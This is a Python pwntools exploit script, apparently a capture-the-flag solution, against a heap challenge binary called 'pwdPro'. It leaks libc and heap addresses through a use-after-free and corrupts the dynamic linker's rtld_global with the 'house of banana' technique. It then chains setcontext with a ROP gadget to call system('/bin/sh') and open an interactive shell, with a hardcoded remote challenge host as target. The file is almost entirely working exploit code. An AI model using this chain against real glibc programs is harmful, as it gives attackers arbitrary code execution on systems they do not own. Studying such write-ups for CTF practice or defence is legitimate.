# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwdPro'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.71.220'
    port = '49261'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

def add(idx,id,size,pwd):
    cmd(1)
    sla('Which PwdBox You Want Add:',idx)
    sla('Input The ID You Want Save:',id)
    sla('Length Of Your Pwd:',size)
    sa('Your Pwd:',pwd)

def delete(id):
    cmd(4)
    sla('Idx you want 2 Delete:',id)

def show(id):
    cmd(3)
    sla('Want Check:',id)

def edit(id,text):
    cmd(2)
    sla('Which PwdBox You Want Edit:',id)
    sleep(0.1)
    se(text)

def recovery(id):
    cmd(5)
    sla('Idx you want 2 Recover:',id)

def decode(payload):
    global key
    rst = ''
    for i in range(0, len(payload) , 8):
        rst += p64( u64 ( payload[i:i+8] ) ^ key)
    return rst

# key 0x0000000000004040
# house_of_banana ha1vk 师傅原创，真的强，但不知为甚么2.31版本通不了

add(0 ,'a', 0x520 , '\x00'*8 + '\n')
ru('Save ID:')
key = u64(p.recv(8))
lg('key',key)

add(1 ,'a', 0x428 , '\x00'*8 + '\n')
add(2 ,'a', 0x500 , '\x00'*8 + '\n')
add(3 ,'a', 0x420 , '\x00'*8 + '\n')

delete(0)
add(4 ,'a', 0x600 , '\x00'*8 + '\n')
add(5 ,'a', 0x600 , '\x00'*8 + '\n')

recovery(0)
# dbg()
show(0)
ru('Pwd is: ')
leak = u64(p.recv(8)) ^ key 
p.recv(8)
heap_addr = u64(p.recv(8)) ^ key 

__malloc_hook = leak - 1056 - 0x70 - 0x10
libc.address = __malloc_hook - libc.sym['__malloc_hook']
# rtld_global = libc.address + 0x222060
rtld_global = libc.address + 0x220060

set_context = libc.sym['setcontext'] + 0x3D
# ret = libc.sym['setcontext'] + 0x351
ret =  libc.sym['setcontext'] + 0x14E
# pop_rdi_ret = libc.address +  0x26b72
pop_rdi_ret = libc.address +  0x277e9

binsh_addr = libc.search('/bin/sh').next()
system_addr =  libc.sym['system']
# chain = libc.address + 2242368
chain = libc.address + 0x221730

delete(2)
delete(4)


recovery(2)

fake = flat(0,0,0, rtld_global - 0x20)
edit(0,fake)
add(6 ,'a', 0x600 , '\x00'*8 + '\n')

payload = p64(0) + p64( chain ) + p64(0) + p64(heap_addr + 0x960)
payload += p64(set_context) + p64(ret)

payload += p64(binsh_addr)
payload += p64(0)
payload += p64(system_addr)
payload += '\x00'*0x80

payload += p64(heap_addr + 0x960 + 0x28 + 0x18)

payload += p64(pop_rdi_ret)
payload = payload.ljust(0x100,'\x00')
payload += p64(heap_addr + 0x960 + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x31C - 0x10,'\x00')
payload += p8(0x8)

edit(2,payload)
edit(1,'b'*0x420 + p64(heap_addr + 0x960 + 0x20))

dbg()

cmd(6)


p.interactive()

'''
@File    :   pwdFree.py
@Time    :   2021/08/21 20:08:21
@Author  :   Niyah 
'''